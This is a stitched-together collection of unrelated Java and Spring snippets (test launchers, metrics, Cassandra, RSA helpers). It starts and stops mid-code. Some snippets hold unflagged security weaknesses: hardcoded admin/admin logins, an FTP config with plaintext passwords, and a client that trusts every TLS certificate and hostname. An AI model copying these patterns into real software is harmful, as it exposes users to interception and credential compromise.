  }
}
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
import com.lankydan.cassandra.movie.entity.MovieByActor;
import com.lankydan.cassandra.movie.entity.MovieByActorKey;
import org.springframework.data.cassandra.repository.CassandraRepository;
import org.springframework.data.cassandra.repository.Query;
import org.springframework.stereotype.Repository;

import java.time.LocalDateTime;
import java.util.List;
import java.util.UUID;

@Repository
public interface MovieByActorRepository extends CassandraRepository<MovieByActor, MovieByActorKey> {

  @Query(allowFiltering = true)
  List<MovieByActor> findByKeyReleaseDateAndKeyMovieId(LocalDateTime releaseDate, UUID movieId);
}
-----------------------------------------------------------------------------------------
public class JwtAuthenticationFilter extends AbstractAuthenticationProcessingFilter {

    public JwtAuthenticationFilter(AuthenticationManager authenticationManager) {
        super("/api/**");
        this.setAuthenticationManager(authenticationManager);
    }

    @Override
    protected boolean requiresAuthentication(HttpServletRequest request, HttpServletResponse response) {
        return super.requiresAuthentication(request, response);
    }
-----------------------------------------------------------------------------------------
@RestController
//@EnablePrometheusEndpoint
public class DemoApplication {
    private static final Counter requestTotal = Counter.build()
            .name("sample_counter")
            .labelNames("status")
            .help("A simple Counter to illustrate custom Counters in Spring Boot and Prometheus").register();

    @GetMapping("/test")
    public String testRequestMetrics() {
        final Random random = new Random(System.currentTimeMillis());
        if (random.nextInt(2) > 0) {
            requestTotal.labels("success").inc();
        } else {
            requestTotal.labels("error").inc();
        }
        return "Welcome to my world!";
    }
}
-----------------------------------------------------------------------------------------
@Bean
public RestTemplate restTemplate() {
    return new RestTemplate(clientHttpRequestFactory());
}

private ClientHttpRequestFactory clientHttpRequestFactory() {
    HttpComponentsClientHttpRequestFactory factory = new HttpComponentsClientHttpRequestFactory();
    factory.setReadTimeout(2000);
    factory.setConnectTimeout(2000);
    return factory;
}}
-----------------------------------------------------------------------------------------
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.authorizeRequests()
                .antMatchers("/web/admin/**").hasAnyRole(ADMIN.toString(), GUEST.toString())
                .anyRequest().permitAll()
                .and()
                .formLogin().loginPage("/web/login").permitAll()
                .and()
                .csrf().ignoringAntMatchers("/contact-email")
                .and()
                .logout().logoutUrl("/web/logout").logoutSuccessUrl("/web/").permitAll();
    }

    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
        auth.inMemoryAuthentication()
                .withUser("admin").password("admin").roles(ADMIN.toString())
                .and()
                .withUser("guest").password("guest").roles(GUEST.toString());
    }

}
-----------------------------------------------------------------------------------------
package ru.javastudy.junit;
 
import org.junit.runner.JUnitCore;
 
public class MainTest {
 
    public static void main(String[] args) {
        System.out.println("Second example in MainTest");
        JUnitCore core = new JUnitCore();
        core.addListener(new CalcTestListener());
        core.run(CalculatorTest.class);
 
        System.out.println("");
        System.out.println("Third example in MainTest");
    }
}
-----------------------------------------------------------------------------------------

/*
 * Copyright 2015-2019 the original author or authors.
 *
 * All rights reserved. This program and the accompanying materials are
 * made available under the terms of the Eclipse Public License v2.0 which
 * accompanies this distribution and is available at
 *
 * https://www.eclipse.org/legal/epl-v20.html
 */

package example;

// tag::imports[]
import static org.junit.platform.engine.discovery.ClassNameFilter.includeClassNamePatterns;
import static org.junit.platform.engine.discovery.DiscoverySelectors.selectClass;
import static org.junit.platform.engine.discovery.DiscoverySelectors.selectPackage;

import java.io.PrintWriter;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.junit.platform.launcher.Launcher;
import org.junit.platform.launcher.LauncherDiscoveryRequest;
import org.junit.platform.launcher.TestExecutionListener;
import org.junit.platform.launcher.TestPlan;
import org.junit.platform.launcher.core.LauncherConfig;
import org.junit.platform.launcher.core.LauncherDiscoveryRequestBuilder;
import org.junit.platform.launcher.core.LauncherFactory;
import org.junit.platform.launcher.listeners.SummaryGeneratingListener;
import org.junit.platform.launcher.listeners.TestExecutionSummary;
import org.junit.platform.reporting.legacy.xml.LegacyXmlReportGeneratingListener;
// end::imports[]

/**
 * @since 5.0
 */
class UsingTheLauncherDemo {

	@org.junit.jupiter.api.Test
	@SuppressWarnings("unused")
	void discovery() {
		// @formatter:off
		// tag::discovery[]
		LauncherDiscoveryRequest request = LauncherDiscoveryRequestBuilder.request()
			.selectors(
				selectPackage("com.example.mytests"),
				selectClass(MyTestClass.class)
			)
			.filters(
				includeClassNamePatterns(".*Tests")
			)
			.build();

		Launcher launcher = LauncherFactory.create();

		TestPlan testPlan = launcher.discover(request);
		// end::discovery[]
		// @formatter:on
	}

	@org.junit.jupiter.api.Test
	@SuppressWarnings("unused")
	void execution() {
		// @formatter:off
		// tag::execution[]
		LauncherDiscoveryRequest request = LauncherDiscoveryRequestBuilder.request()
			.selectors(
				selectPackage("com.example.mytests"),
				selectClass(MyTestClass.class)
			)
			.filters(
				includeClassNamePatterns(".*Tests")
			)
			.build();

		Launcher launcher = LauncherFactory.create();

		// Register a listener of your choice
		SummaryGeneratingListener listener = new SummaryGeneratingListener();
		launcher.registerTestExecutionListeners(listener);

		launcher.execute(request);

		TestExecutionSummary summary = listener.getSummary();
		// Do something with the TestExecutionSummary.

		// end::execution[]
		// @formatter:on
	}

	@org.junit.jupiter.api.Test
	void launcherConfig() {
		Path reportsDir = Paths.get("target", "xml-reports");
		PrintWriter out = new PrintWriter(System.out);
		// @formatter:off
		// tag::launcherConfig[]
		LauncherConfig launcherConfig = LauncherConfig.builder()
			.enableTestEngineAutoRegistration(false)
			.enableTestExecutionListenerAutoRegistration(false)
			.addTestEngines(new CustomTestEngine())
			.addTestExecutionListeners(new LegacyXmlReportGeneratingListener(reportsDir, out))
			.addTestExecutionListeners(new CustomTestExecutionListener())
			.build();

		Launcher launcher = LauncherFactory.create(launcherConfig);

		LauncherDiscoveryRequest request = LauncherDiscoveryRequestBuilder.request()
			.selectors(selectPackage("com.example.mytests"))
			.build();

		launcher.execute(request);
		// end::launcherConfig[]
		// @formatter:on
	}

}

class MyTestClass {
}

class CustomTestExecutionListener implements TestExecutionListener {
}


import static org.junit.platform.engine.discovery.ClassNameFilter.includeClassNamePatterns;
import static org.junit.platform.engine.discovery.DiscoverySelectors.selectClass;
import static org.junit.platform.engine.discovery.DiscoverySelectors.selectPackage;
import org.junit.platform.launcher.Launcher;
import org.junit.platform.launcher.LauncherDiscoveryRequest;
import org.junit.platform.launcher.TestExecutionListener;
import org.junit.platform.launcher.TestPlan;
import org.junit.platform.launcher.core.LauncherDiscoveryRequestBuilder;
import org.junit.platform.launcher.core.LauncherFactory;
import org.junit.platform.launcher.listeners.SummaryGeneratingListener;
 
public class TestLauncher {
    public void LaunchTests () {
        LauncherDiscoveryRequest request = LauncherDiscoveryRequestBuilder.request()
                .selectors(
                        selectClass(TestSuiteA.class)
                )
                .filters(
                )
                .build();
        Launcher launcher = LauncherFactory.create();
        TestPlan testPlan = launcher.discover(request);
        // Register a listener of your choice
        TestExecutionListener listener = new TesultsListener();
        launcher.registerTestExecutionListeners(listener);
        launcher.execute(request);
    }
}
-----------------------------------------------------------------------------------------
import com.jayway.restassured.RestAssured;
import com.junit.demo.JunitApplication;
import com.junit.demo.extension.WiremockExtension;
import org.hamcrest.Matchers;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.web.server.LocalServerPort;
import static com.github.tomakehurst.wiremock.client.WireMock.*;
@ExtendWith(WiremockExtension.class)
@SpringBootTest(classes = {JunitApplication.class}, webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class DemoApiIT {
    @BeforeEach
    void setup(@LocalServerPort int port) {
        RestAssured.basePath = "/demo";
        RestAssured.port = port;
    }
    @Test
    void testUserApi() {
        stubFor(get(urlPathMatching("/users/.*"))
             .willReturn(
                 aResponse()
                   .withStatus(200)
                   .withHeader("content-type", "application/json")
                   .withBodyFile("UserResponse.json"))
        );
        RestAssured
                .get("/{userId}", "testId")
                .then()
                .assertThat()
                .statusCode(200)
                .body(Matchers.containsString("testUser"));
        verify(exactly(1), getRequestedFor(urlPathMatching("/users/.*")));
    }
    @Test
    void testUserApi1() {
        stubFor(get(urlPathMatching("/users/.*"))
                .willReturn(
                   aResponse()
                     .withStatus(200)
                     .withHeader("content-type", "application/json")
                     .withBodyFile("UserResponse.json"))
        );
        RestAssured
                .get("/{userId}", "testId")
                .then()
                .assertThat()
                .statusCode(200)
                .body(Matchers.containsString("testUser"));
        
        // will fail if you have not reset wiremock
        verify(exactly(1), getRequestedFor(urlPathMatching("/users/.*")));
    }

-----------------------------------------------------------------------------------------
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
class JunitOrderAnnotationTest {
    @Test
    @Order(2)
    void testC() {}
    @Test
    @Order(1)
    void testA() {}
    @Test
    void testB() {}
}
-----------------------------------------------------------------------------------------
 public class MyExtension implements
      BeforeEachCallback,
      AfterEachCallback {

    @Override
    public void beforeEach(ExtensionContext ctx) throws Exception {
      final List<String> values = new ArrayList<>();
      values.add("something magic");
      ctx
          .getStore(ExtensionContext.Namespace.create("my-storage"))
          .put("instance" , values);
    }

    @Override
    public void afterEach(ExtensionContext ctx) throws Exception {
      final List<String> values = ctx
          .getStore(ExtensionContext.Namespace.create("my-storage"))
          .get("instance" , List.class);

      values.forEach(System.out::println);
    }
  }
-----------------------------------------------------------------------------------------
public class IgnoreFileNotFoundExceptionExtension 
  implements TestExecutionExceptionHandler {
 
    Logger logger = LogManager
      .getLogger(IgnoreFileNotFoundExceptionExtension.class);
     
    @Override
    public void handleTestExecutionException(ExtensionContext context,
      Throwable throwable) throws Throwable {
 
        if (throwable instanceof FileNotFoundException) {
            logger.error("File not found:" + throwable.getMessage());
            return;
        }
        throw throwable;
    }
}
-----------------------------------------------------------------------------------------
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import javax.servlet.Filter;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;
import javax.servlet.FilterChain;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
@WebFilter(urlPatterns = "/api/count")
public class ExampleFilter implements Filter{
    private static final Logger logger = LoggerFactory.getLogger(ExampleFilter.class);
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        logger.info("filter:"+ ((HttpServletRequest)servletRequest).getRequestURL());
        filterChain.doFilter(servletRequest, servletResponse);
    }
    @Override
    public void destroy() {
    }

-----------------------------------------------------------------------------------------
<project>
  ...
  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>build-helper-maven-plugin</artifactId>
        <version>3.0.0</version>
        <executions>
          <execution>
            <id>timestamp-property</id>
            <goals>
              <goal>timestamp-property</goal>
            </goals>
            <configuration>
              <name>next.year</name>
              <pattern>yyyy</pattern>
              <unit>year</unit>
              <offset>+1</offset>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
  ...
</project>
-----------------------------------------------------------------------------------------
public interface HasContactInformation {
 
    String getFirstName();
    void setFirstName(String firstName);
 
    String getFullName();
 
    String getLastName();
    void setLastName(String lastName);
 
    String getPhoneNr();
    void setPhoneNr(String phoneNr);
 
}
And now an adapter as a support class:

@Data
public class ContactInformationSupport implements HasContactInformation {
 
    private String firstName;
    private String lastName;
    private String phoneNr;
 
    @Override
    public String getFullName() {
        return getFirstName() + " " + getLastName();
    }
}
The interesting part comes now, see how easy it is to now compose contact information into both model classes:

public class User implements HasContactInformation {
 
    // Whichever other User-specific attributes
 
    @Delegate(types = {HasContactInformation.class})
    private final ContactInformationSupport contactInformation =
            new ContactInformationSupport();
 
    // User itself will implement all contact information by delegation
     
}
-----------------------------------------------------------------------------------------
@echo off
start Brackets.exe %*

-----------------------------------------------------------------------------------------
@SupportedSourceVersion(SourceVersion.RELEASE_8)
-----------------------------------------------------------------------------------------
ftp.server.ip=129.9.100.10
ftp.server.port=21
ftp.client.name=read
ftp.client.password=readpdf
ftp.client.name.canwrite=capital
ftp.client.password.canwrite=capitalpass

https://www.programcreek.com/java-api-examples/index.php?project_name=kbastani%2Fspring-boot-starter-amazon-s3#
-----------------------------------------------------------------------------------------
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.http.client.ClientHttpResponse;
import org.springframework.http.client.SimpleClientHttpRequestFactory;
import org.springframework.web.client.DefaultResponseErrorHandler;
import org.springframework.web.client.RestOperations;
import org.springframework.web.client.RestTemplate;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.Proxy;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;


@SpringBootApplication
public class RouteServiceApplication {

    public static void main(String[] args) {
        SpringApplication.run(RouteServiceApplication.class, args);
    }

    @Bean
    RestOperations restOperations() {
        RestTemplate restTemplate = new RestTemplate(new TrustEverythingClientHttpRequestFactory());
        restTemplate.setErrorHandler(new NoErrorsResponseErrorHandler());
        return restTemplate;
    }

    private static final class NoErrorsResponseErrorHandler extends DefaultResponseErrorHandler {

        @Override
        public boolean hasError(ClientHttpResponse response) throws IOException {
            return false;
        }

    }

    private static final class TrustEverythingClientHttpRequestFactory extends SimpleClientHttpRequestFactory {

        @Override
        protected HttpURLConnection openConnection(URL url, Proxy proxy) throws IOException {
            HttpURLConnection connection = super.openConnection(url, proxy);

            if (connection instanceof HttpsURLConnection) {
                HttpsURLConnection httpsConnection = (HttpsURLConnection) connection;

                httpsConnection.setSSLSocketFactory(getSslContext(new TrustEverythingTrustManager()).getSocketFactory());
                httpsConnection.setHostnameVerifier(new TrustEverythingHostNameVerifier());
            }

            return connection;
        }

        private static SSLContext getSslContext(TrustManager trustManager) {
            try {
                SSLContext sslContext = SSLContext.getInstance("SSL");
                sslContext.init(null, new TrustManager[]{trustManager}, null);
                return sslContext;
            } catch (KeyManagementException | NoSuchAlgorithmException e) {
                throw new RuntimeException(e);

            }

        }
    }

    private static final class TrustEverythingHostNameVerifier implements HostnameVerifier {

        @Override
        public boolean verify(String s, SSLSession sslSession) {
            return true;
        }

    }

    private static final class TrustEverythingTrustManager implements X509TrustManager {

        @Override
        public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
        }

        @Override
        public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }

    }

}
-----------------------------------------------------------------------------------------
import java.util.UUID;

/**
 * Created by alex on 2017/10/27.
 */
public class NonceUtils {
    public static String nonce() {
        return UUID.randomUUID().toString().replace("-", "").toLowerCase();
    }
}
-----------------------------------------------------------------------------------------
import org.apache.commons.codec.binary.Base64;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.nio.ByteBuffer;
import java.security.*;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Created by alex on 2017/10/22.
 */
public class DefaultCipherHelper implements CipherHelper {

    private final String ALGORITHM = "RSA";
    private final String CIPHER_ALGORITHM = "RSA/ECB/PKCS1Padding";
    private final String SIGN_ALGORITHMS = "SHA1WithRSA";

    private final String publicKey;
    private final String privateKey;

    public DefaultCipherHelper(String publicKey, String privateKey) {
        this.publicKey = publicKey;
        this.privateKey = privateKey;
    }

    public byte[] encrypt(byte[] plaintext) {
        try {
            // 使用默认RSA
            RSAPublicKey publicKey = createPublicKey(this.publicKey);
            Cipher cipher = Cipher.getInstance(CIPHER_ALGORITHM);

            cipher.init(Cipher.ENCRYPT_MODE, publicKey);

            int bitLengthOfPuk = publicKey.getModulus().bitLength() / 8;
            int blockSize = bitLengthOfPuk - 11;
            if (plaintext.length > blockSize) {
                List<byte[]> blocks = block(plaintext, blockSize);
                ByteBuffer buffer = ByteBuffer.allocate(blocks.size() * bitLengthOfPuk);
                for (byte[] block : blocks) {
                    buffer.put(cipher.doFinal(block));
                }
                return buffer.array();
            } else {
                return cipher.doFinal(plaintext);
            }

        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("无此加密算法");
        } catch (NoSuchPaddingException e) {
            throw new RuntimeException("padding算法不存在");
        } catch (InvalidKeyException e) {
            throw new RuntimeException("加密公钥非法,请检查");
        } catch (IllegalBlockSizeException e) {
            throw new RuntimeException("明文长度非法");
        } catch (BadPaddingException e) {
            throw new RuntimeException("明文数据已损坏");
        }
    }

    public byte[] decrypt(byte[] ciphertext) {
        try {
            // 使用默认RSA
            RSAPrivateKey privateKey = createPrivateKey(this.privateKey);
            Cipher cipher = Cipher.getInstance(CIPHER_ALGORITHM);

            cipher.init(Cipher.DECRYPT_MODE, privateKey);

            int blockSize = privateKey.getModulus().bitLength() / 8;
            if (ciphertext.length > blockSize) {
                List<byte[]> blocks = block(ciphertext, blockSize);
                ByteBuffer buffer = ByteBuffer.allocate(blocks.size() * blockSize);
                for (byte[] block : blocks) {
                    buffer.put(cipher.doFinal(block));
                }

                buffer.flip();
                byte[] result = new byte[buffer.limit()];
                buffer.get(result);
                return result;
            } else {
                return cipher.doFinal(ciphertext);
            }
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("无此加密算法");
        } catch (NoSuchPaddingException e) {
            throw new RuntimeException("padding算法不存在");
        } catch (InvalidKeyException e) {
            throw new RuntimeException("加密公钥非法,请检查");
        } catch (IllegalBlockSizeException e) {
            throw new RuntimeException("明文长度非法");
        } catch (BadPaddingException e) {
            throw new RuntimeException("明文数据已损坏");
        }
    }


    public byte[] sign(byte[] data, byte[] nonce) {
        try {
            PrivateKey privateKey = createPrivateKey(this.privateKey);
            Signature signature = Signature.getInstance(SIGN_ALGORITHMS);
            signature.initSign(privateKey);

            byte[] withSalt = concat(data, nonce);

            signature.update(withSalt);
            return signature.sign();
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("无此加密算法");
        } catch (InvalidKeyException e) {
            throw new RuntimeException("加密公钥非法,请检查");
        } catch (SignatureException e) {
            throw new RuntimeException("签名异常");
        }
    }

    public boolean verify(byte[] data, byte[] nonce, byte[] signature) {
        try {
            PublicKey publicKey = createPublicKey(this.publicKey);
            Signature instance = Signature.getInstance(SIGN_ALGORITHMS);
            instance.initVerify(publicKey);
            byte[] withSalt = concat(data, nonce);
            instance.update(withSalt);
            return instance.verify(signature);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("无此加密算法");
        } catch (InvalidKeyException e) {
            throw new RuntimeException("加密公钥非法,请检查");
        } catch (SignatureException e) {
            throw new RuntimeException("签名异常");
        }
    }


    private RSAPublicKey createPublicKey(String puk) {
        try {
            byte[] buffer = Base64.decodeBase64(puk);
            KeyFactory keyFactory = KeyFactory.getInstance(ALGORITHM);
            KeySpec keySpec = new X509EncodedKeySpec(buffer);
            return (RSAPublicKey) keyFactory.generatePublic(keySpec);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("无此算法");
        } catch (InvalidKeySpecException e) {
            throw new RuntimeException("公钥非法");
        } catch (NullPointerException e) {
            throw new RuntimeException("公钥数据为空");
        }
    }

    private RSAPrivateKey createPrivateKey(String prk) {
        try {
            byte[] buffer = Base64.decodeBase64(prk);
            KeySpec keySpec = new PKCS8EncodedKeySpec(buffer);
            KeyFactory keyFactory = KeyFactory.getInstance(ALGORITHM);
            return (RSAPrivateKey) keyFactory.generatePrivate(keySpec);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("无此算法");
        } catch (InvalidKeySpecException e) {
            throw new RuntimeException("私钥非法");
        } catch (NullPointerException e) {
            throw new RuntimeException("私钥数据为空");
        }
    }

    private byte[] concat(byte[] b1, byte[] b2) {
        byte[] withSalt = new byte[b1.length + b2.length];
        System.arraycopy(b1, 0, withSalt, 0, b1.length);
        System.arraycopy(b2, 0, withSalt, b1.length, b2.length);
        return withSalt;
    }

    private List<byte[]> block(byte[] src, int blockSize) {
        int group;
        if (src.length % blockSize == 0) {
            group = src.length / blockSize;
        } else {
            group = src.length / blockSize + 1;
        }

        List<byte[]> blocks = new ArrayList<byte[]>();
        for (int i = 0; i < group; i++) {
            int from = i * blockSize;
            int to = Math.min(src.length, (i + 1) * blockSize);

            byte[] block = Arrays.copyOfRange(src, from, to);

            blocks.add(block);
        }
        return blocks;
    }

}
-----------------------------------------------------------------------------------------
import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Before;

@Aspect
public class RemoteWebDriverAspect {

    @Before("call(org.openqa.selenium.remote.RemoteWebDriver+.new(..))")
    @SuppressWarnings("PMD.AvoidCatchingThrowable")
    public void remoteWebDriverBeforeAspect(JoinPoint joinPoint) throws Throwable {
        System.out.println("Before Creating driver...");
    }

    @Around("call(org.openqa.selenium.remote.RemoteWebDriver+.new(..))")
    @SuppressWarnings("PMD.AvoidCatchingThrowable")
    public Object remoteWebDriverAspect(ProceedingJoinPoint point) throws Throwable {

        //Code to run before creating the driver
        long startTime = System.currentTimeMillis();
        System.out.println("\n[" + elapsedTime(startTime) + "] Trying to create a Remote Web Driver");
        Object driver = null;
        int numOfRetries = 0;
        while (driver == null & numOfRetries < Constants.MaxTimesToRetry) {
            try {
                System.out.println("[" + elapsedTime(startTime) + "] Try number : " + numOfRetries);
                driver = point.proceed();
            } catch (Throwable throwable) {
                System.out.println("[" + elapsedTime(startTime) + "] Device allocation failed");
                String message = throwable.getMessage();
                System.out.println(message);
                numOfRetries++;
                Thread.sleep(Constants.WaitOnRetry);
            }
        }

        if (driver != null) {
            //Code to run after successfully creating a driver
            System.out.println("[" + elapsedTime(startTime) + "] Remote Web Driver initialized successfully");
        }

        else {
            //Code to run when used up retries with no success
            System.out.println("[" + elapsedTime(startTime) + "] Failed to initialize a Remote Web Driver");
            //Throw exception?
        }

        return driver;
    }

    private long elapsedTime(long startTime){
        return (System.currentTimeMillis() - startTime) / 1000;
    }
}
-----------------------------------------------------------------------------------------
	private static void handleError(HttpURLConnection connection) throws IOException {
		String msg = "Failed to upload media.";
		InputStream errorStream = connection.getErrorStream();
		if (errorStream != null) {
			InputStreamReader inputStreamReader = new InputStreamReader(errorStream, UTF_8);
			BufferedReader bufferReader = new BufferedReader(inputStreamReader);
			try {
				StringBuilder builder = new StringBuilder();
				String outputString;
				while ((outputString = bufferReader.readLine()) != null) {
					if (builder.length() != 0) {
						builder.append("\n");
					}
					builder.append(outputString);
				}
				String response = builder.toString();
				msg += "Response: " + response;
			}
			finally {
				bufferReader.close();
			}
		}
		throw new RuntimeException(msg);
	}

	private static byte[] readFile(File path) throws FileNotFoundException, IOException {
		int length = (int)path.length();
		byte[] content = new byte[length];
		InputStream inStream = new FileInputStream(path);
		try {
			inStream.read(content);
		}
		finally {
			inStream.close();
		}
		return content;
	}

	private static byte[] readURL(URL url) throws IOException {
		HttpURLConnection connection = (HttpURLConnection)url.openConnection();
		connection.setDoOutput(true);
		int code = connection.getResponseCode();
		if (code > HttpURLConnection.HTTP_OK) {
			handleError(connection);
		}
		InputStream stream = connection.getInputStream();

		if (stream == null) {
			throw new RuntimeException("Failed to get content from url " + url + " - no response stream");
		}
		byte[] content = read(stream);
		return content;
	}

	private static byte[] read(InputStream input) throws IOException {
		ByteArrayOutputStream output = new ByteArrayOutputStream();
		try {
			byte[] buffer = new byte[1024];
			int nBytes = 0;
			while ((nBytes = input.read(buffer)) > 0) {
				output.write(buffer, 0, nBytes);
			}
			byte[] result = output.toByteArray();
			return result;
		} finally {
			try{
				input.close();
			} catch (IOException e){

			}
		}
	}
-----------------------------------------------------------------------------------------
import io.prometheus.client.Summary;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Pointcut;
import org.aspectj.lang.reflect.MethodSignature;
import org.springframework.context.annotation.Scope;
import org.springframework.core.annotation.AnnotationUtils;
import org.springframework.util.ReflectionUtils;
import org.springframework.web.bind.annotation.ControllerAdvice;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReadWriteLock;
import java.util.concurrent.locks.ReentrantReadWriteLock;

/**
 * This class automatically times (via aspectj) the execution of annotated methods, if it's been enabled via {@link EnablePrometheusTiming},
 * for methods annotated with {@link PrometheusTimeMethod}
 *
 * @author Andrew Stuart
 */
@Aspect("pertarget(io.prometheus.client.spring.web.MethodTimer.timeable())")
@Scope("prototype")
@ControllerAdvice
public class MethodTimer {
    private final ReadWriteLock summaryLock = new ReentrantReadWriteLock();
    private final HashMap<String, Summary> summaries = new HashMap<String, Summary>();

    @Pointcut("@annotation(io.prometheus.client.spring.web.PrometheusTimeMethod)")
    public void annotatedMethod() {}

    @Pointcut("annotatedMethod()")
    public void timeable() {}

    private PrometheusTimeMethod getAnnotation(ProceedingJoinPoint pjp) throws NoSuchMethodException {
        assert(pjp.getSignature() instanceof MethodSignature);
        MethodSignature signature = (MethodSignature) pjp.getSignature();

        PrometheusTimeMethod annot = AnnotationUtils.findAnnotation(pjp.getTarget().getClass(), PrometheusTimeMethod.class);
        if (annot != null) {
            return annot;
        }

        // When target is an AOP interface proxy but annotation is on class method (rather than Interface method).
        final String name = signature.getName();
        final Class[] parameterTypes = signature.getParameterTypes();
        Method method = ReflectionUtils.findMethod(pjp.getTarget().getClass(), name, parameterTypes);
        return AnnotationUtils.findAnnotation(method, PrometheusTimeMethod.class);
    }

    private Summary ensureSummary(ProceedingJoinPoint pjp, String key) throws IllegalStateException {
        PrometheusTimeMethod annot;
        try {
            annot = getAnnotation(pjp);
        } catch (NoSuchMethodException e) {
            throw new IllegalStateException("Annotation could not be found for pjp \"" + pjp.toShortString() +"\"", e);
        } catch (NullPointerException e) {
            throw new IllegalStateException("Annotation could not be found for pjp \"" + pjp.toShortString() +"\"", e);
        }

        assert(annot != null);

        Summary summary;

        // We use a writeLock here to guarantee no concurrent reads.
        final Lock writeLock = summaryLock.writeLock();
        writeLock.lock();
        try {
            // Check one last time with full mutual exclusion in case multiple readers got null before creation.
            summary = summaries.get(key);
            if (summary != null) {
                return summary;
            }

            // Now we know for sure that we have never before registered.
            summary = Summary.build()
                    .name(annot.name())
                    .help(annot.help())
                    .register();

            // Even a rehash of the underlying table will not cause issues as we mutually exclude readers while we
            // perform our updates.
            summaries.put(key, summary);

            return summary;
        } finally {
            writeLock.unlock();
        }
    }

    @Around("timeable()")
    public Object timeMethod(ProceedingJoinPoint pjp) throws Throwable {
        String key = pjp.getSignature().toLongString();

        Summary summary;
        final Lock r = summaryLock.readLock();
        r.lock();
        try {
            summary = summaries.get(key);
        } finally {
            r.unlock();
        }

        if (summary == null) {
            summary = ensureSummary(pjp, key);
        }

        final Summary.Timer t = summary.startTimer();

        try {
            return pjp.proceed();
        } finally {
            t.observeDuration();
        }
    }
}
-----------------------------------------------------------------------------------------
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;

import javax.xml.transform.Source;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.stream.StreamResult;
import javax.xml.transform.stream.StreamSource;

import org.apache.commons.configuration.ConfigurationException;
import org.apache.commons.configuration.XMLConfiguration;
import org.apache.commons.configuration.tree.xpath.XPathExpressionEngine;

/**
 * @author Chirag Jayswal
 *
 */
public class XPathUtils {

	/**
	 * 
	 * @param xmlFile
	 * @return
	 * @throws IOException
	 */
	public static XMLConfiguration read(File xmlFile) throws IOException{
		String xmlsrc = FileUtil.readFileToString(xmlFile, "UTF-8");
		return read(xmlsrc);
	}
	
	/**
	 * 
	 * @param src
	 * @return
	 */
	public static XMLConfiguration read(String src) {
		try {
			// remove all namespaces from xml
			src = removeNSAndPreamble(src);
			XMLConfiguration config = new XMLConfiguration();
			config.setDelimiterParsingDisabled(true);
			config.load(new ByteArrayInputStream(src.getBytes()));
			config.setExpressionEngine(new XPathExpressionEngine());
			return config;

		} catch (ConfigurationException e) {
			throw new RuntimeException(e);
		}
	}

	/**
	 * 
	 * @param xmlStr
	 * @return
	 */
	private static String removeNSAndPreamble(String xmlStr) {
